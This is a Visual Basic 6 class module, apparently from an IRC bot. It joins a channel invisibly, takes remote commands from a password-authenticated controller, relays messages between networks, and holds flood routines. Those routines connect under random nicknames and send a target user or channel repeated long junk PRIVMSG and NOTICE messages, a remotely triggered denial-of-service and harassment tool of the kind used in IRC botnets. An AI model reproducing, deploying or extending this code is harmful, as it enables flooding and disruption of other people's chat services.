VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsSocketControl"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Public Sub Main_Connect(nIndex As Integer)
    On Error GoTo ErrTrap
    Call frmMain.socket(nIndex%).SendData("USER " & Bot.Nick & " . . :" & Bot.Version & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("NICK " & Bot.Nick & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("JOIN " & Bot.Channel & " " & Bot.ChanPass & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("MODE " & Bot.Nick & " +i" & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Public Sub Main_DataArrival(nIndex As Integer)
    On Error GoTo ErrTrap
    Dim sData As String, sNick As String, sIdent As String, sHost As String
    Dim sTemp As String, nPipe As Integer, sPipe() As String, sMsg As String
    Dim sCommand As String, sParams As String, sArray() As String
    Call frmMain.socket(nIndex%).PeekData(sData$)
    If Right$(sData$, 1) <> Chr$(10) Then Exit Sub
    Call frmMain.socket(nIndex%).GetData(sData$)
    sData$ = Replace$(sData$, Chr$(13), "")
    If Left$(UCase$(sData$), 5) = "PING " Then
        Call frmMain.socket(nIndex%).SendData("PONG " & frmMain.socket(nIndex%).LocalIP & vbCrLf)
        Exit Sub
    End If
    If Not (Left$(sData$, 1) = ":" And Len(sData$) > 2) Then Exit Sub
    sData$ = Mid$(sData$, 2)
    If Not (InStr(sData$, "!") > 1 And InStr(sData$, "@") > 3 And InStr(sData$, " ") > 5) Then Exit Sub
    sTemp$ = Left$(sData$, InStr(sData$, " ") - 1)
    sNick$ = Left$(sTemp$, InStr(sTemp$, "!") - 1)
    sTemp$ = Mid$(sTemp$, InStr(sTemp$, "!") + 1)
    sIdent$ = Left$(sTemp$, InStr(sTemp$, "@") - 1)
    sTemp$ = Mid$(sTemp$, InStr(sTemp$, "@") + 1)
    sHost$ = Trim$(sTemp$)
    sTemp$ = ""
    If Not (InStr(sData$, " ") > 5 And InStr(sData$, ":") > 7) Then Exit Sub
    sTemp$ = Mid$(sData$, InStr(sData$, " ") + 1)
    sMsg$ = UCase$(Trim$(Left$(sTemp$, InStr(sTemp$, ":") - 1)))
    sCommand$ = Trim$(Mid$(sTemp$, InStr(sTemp$, ":") + 1))
    If Right$(sCommand$, 1) = Chr$(10) And Len(sCommand$) > 1 Then sCommand$ = Left$(sCommand$, Len(sCommand$) - 1)
    If Bot.BridgeType = "->" Then
        If frmMain.socket(Bot.BridgeIndex).State = sckConnected Then Call frmMain.socket(Bot.BridgeIndex).SendData("PRIVMSG " & Bot.BridgeChannel & " :[" & Format(Time, "hh:nn") & "] <" & sNick$ & "> " & sCommand$ & vbCrLf)
    ElseIf Bot.BridgeType = "<->" Then
        If frmMain.socket(Bot.BridgeIndex).State = sckConnected Then Call frmMain.socket(Bot.BridgeIndex).SendData("PRIVMSG " & Bot.BridgeChannel & " :[" & Format(Time, "hh:nn") & "] <" & sNick$ & "> " & sCommand$ & vbCrLf)
    End If
    sPipe$ = Split(sCommand$, "|")
    For nPipe% = 0 To UBound(sPipe())
        sCommand$ = Trim$(sPipe(nPipe%))
        If Left$(sCommand$, 1) <> Bot.Prefix Then
            Exit Sub
        Else
            If Len(sCommand$) < 2 Then Exit Sub
        End If
        sCommand$ = Mid$(sCommand$, 2)
        If sMsg$ <> "PRIVMSG " & UCase$(Bot.Nick) Then
            If sMsg$ <> "PRIVMSG " & UCase$(Bot.Channel) Then Exit Sub
        End If
        sArray() = Split(sCommand$, " ")
        sArray(0) = UCase$(sArray(0))
        If sArray(0) = "PASS" Then
            If UBound(sArray()) > 1 Then
                If Bot.LoginHost = sHost$ And Bot.LoginIdent = sIdent$ And Bot.LoginNick = sNick$ Then
                    If sArray(2) <> "" Then
                        Bot.Pass = sArray(2)
                        Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Password changed to: " & sArray(2) & vbCrLf)
                    End If
                End If
            ElseIf UBound(sArray()) = 1 Then
                If Bot.LoginNick <> "" Then
                    Call frmMain.socket(nIndex%).SendData("NOTICE " & sNick$ & " :User " & Bot.LoginNick & "!" & Bot.LoginIdent & "@" & Bot.LoginHost & " already logged in." & vbCrLf)
                    Exit Sub
                Else
                    If sArray(1) = Bot.Pass Then
                        Bot.LoginNick = sNick$
                        Bot.LoginIdent = sIdent$
                        Bot.LoginHost = sHost$
                        Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :You are now recognized." & vbCrLf)
                    End If
                End If
            End If
        ElseIf sArray(0) = "ADMIN" Then
            If sArray(1) = Bot.Admin Then
                Bot.LoginNick = sNick$
                Bot.LoginIdent = sIdent$
                Bot.LoginHost = sHost$
                Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :You are now logged in as admin." & vbCrLf)
                If sArray(2) <> "" Then
                    Bot.Admin = sArray(2)
                    Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :Admin password changed to: " & sArray(2) & vbCrLf)
                End If
            End If
        End If
        If InStr(sCommand$, " ") > 0 Then
            sParams$ = Trim$(Mid$(sCommand$, InStr(sCommand$, " ")))
            sCommand$ = Trim$(Left$(sCommand$, InStr(sCommand$, " ")))
        Else
            sCommand$ = Trim$(sCommand$)
            sParams$ = ""
        End If
        If Bot.LoginNick = sNick$ And Bot.LoginIdent = sIdent$ And Bot.LoginHost = sHost$ Then Call Bot.CommandProcess(sCommand$, sParams$, nIndex%)
    Next nPipe%
Exit Sub
ErrTrap:
End Sub

Public Sub Flood_Connect(nIndex As Integer)
    Dim nK As Integer, sTemp As String
    For nK% = 0 To 8
        Randomize
        sTemp$ = sTemp$ & Chr$(Fix((Rnd * 26) + 97))
    Next nK%
    Call frmMain.socket(nIndex%).SendData("USER " & sTemp$ & " . . :" & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("NICK " & sTemp$ & vbCrLf)
    If Left$(Bot.FloodName, 1) = "#" Then
        Call frmMain.socket(nIndex%).SendData("JOIN " & Bot.FloodName & vbCrLf)
    Else
        sTemp$ = ""
        For nK% = 0 To 299
            sTemp$ = sTemp$ & Chr$(Fix((Rnd * 26) + 97))
        Next nK%
        For nK% = 1 To Bot.FloodCount
            Call frmMain.socket(nIndex%).SendData("PRIVMSG " & Bot.FloodName & " :" & UCase$(sTemp$) & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.FloodName & " :" & UCase$(sTemp$) & vbCrLf)
        Next nK%
        Call frmMain.socket(nIndex%).SendData("QUIT" & vbCrLf)
    End If
End Sub

Public Sub Flood_DataArrival(nIndex As Integer)
    On Error GoTo ErrTrap
    Dim sTemp As String, nK As Integer, sData As String
    Call frmMain.socket(nIndex%).GetData(sData$)
    If Left$(Bot.FloodName, 1) = "#" Then
        If InStr(sData$, "JOIN :#") > 0 Then
            For nK% = 0 To 299
                sTemp$ = sTemp$ & Chr$(Fix((Rnd * 26) + 97))
            Next nK%
            For nK% = 1 To Bot.FloodCount
                Call frmMain.socket(nIndex%).SendData("PRIVMSG " & Bot.FloodName & " :" & UCase$(sTemp$) & vbCrLf)
                Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.FloodName & " :" & UCase$(sTemp$) & vbCrLf)
            Next nK%
            Call frmMain.socket(nIndex%).SendData("QUIT" & vbCrLf)
        End If
    End If
Exit Sub
ErrTrap:
End Sub

Public Sub Bridge_Connect(nIndex As Integer)
    On Error GoTo ErrTrap
    Call frmMain.socket(nIndex%).SendData("USER " & Bot.BridgeNick & " . . :" & Bot.Version & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("NICK " & Bot.BridgeNick & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("JOIN " & Bot.BridgeChannel & " " & Bot.ChanPass & vbCrLf)
    Call frmMain.socket(nIndex%).SendData("MODE " & Bot.BridgeNick & " +i" & vbCrLf)
Exit Sub
ErrTrap:
End Sub

Public Sub Bridge_DataArrival(nIndex As Integer)
    On Error GoTo ErrTrap
    Dim sData As String, sNick As String, sIdent As String, sHost As String
    Dim sTemp As String, nPipe As Integer, sPipe() As String, sMsg As String
    Dim sCommand As String, sParams As String, sArray() As String
    Call frmMain.socket(nIndex%).PeekData(sData$)
    If Right$(sData$, 1) <> Chr$(10) Then Exit Sub
    Call frmMain.socket(nIndex%).GetData(sData$)
    sData$ = Replace$(sData$, Chr$(13), "")
    If Left$(UCase$(sData$), 5) = "PING " Then
        Call frmMain.socket(nIndex%).SendData("PONG " & frmMain.socket(nIndex%).LocalIP & vbCrLf)
        Exit Sub
    End If
    If Not (Left$(sData$, 1) = ":" And Len(sData$) > 2) Then Exit Sub
    sData$ = Mid$(sData$, 2)
    If Not (InStr(sData$, "!") > 1 And InStr(sData$, "@") > 3 And InStr(sData$, " ") > 5) Then Exit Sub
    sTemp$ = Left$(sData$, InStr(sData$, " ") - 1)
    sNick$ = Left$(sTemp$, InStr(sTemp$, "!") - 1)
    sTemp$ = Mid$(sTemp$, InStr(sTemp$, "!") + 1)
    sIdent$ = Left$(sTemp$, InStr(sTemp$, "@") - 1)
    sTemp$ = Mid$(sTemp$, InStr(sTemp$, "@") + 1)
    sHost$ = Trim$(sTemp$)
    sTemp$ = ""
    If Not (InStr(sData$, " ") > 5 And InStr(sData$, ":") > 7) Then Exit Sub
    sTemp$ = Mid$(sData$, InStr(sData$, " ") + 1)
    sMsg$ = UCase$(Trim$(Left$(sTemp$, InStr(sTemp$, ":") - 1)))
    sCommand$ = Trim$(Mid$(sTemp$, InStr(sTemp$, ":") + 1))
    If Right$(sCommand$, 1) = Chr$(10) And Len(sCommand$) > 1 Then sCommand$ = Left$(sCommand$, Len(sCommand$) - 1)
    If sMsg$ <> "PRIVMSG " & UCase$(Bot.BridgeNick) Then
        If sMsg$ <> "PRIVMSG " & UCase$(Bot.BridgeChannel) Then Exit Sub
    End If
    If Bot.BridgeType = "<-" Then
        Call frmMain.socket(0).SendData("PRIVMSG " & Bot.Channel & " :[" & Format(Time, "hh:nn") & "] <" & sNick$ & "> " & sCommand$ & vbCrLf)
    ElseIf Bot.BridgeType = "<->" Then
        Call frmMain.socket(0).SendData("PRIVMSG " & Bot.Channel & " :[" & Format(Time, "hh:nn") & "] <" & sNick$ & "> " & sCommand$ & vbCrLf)
    End If
Exit Sub
ErrTrap:
End Sub
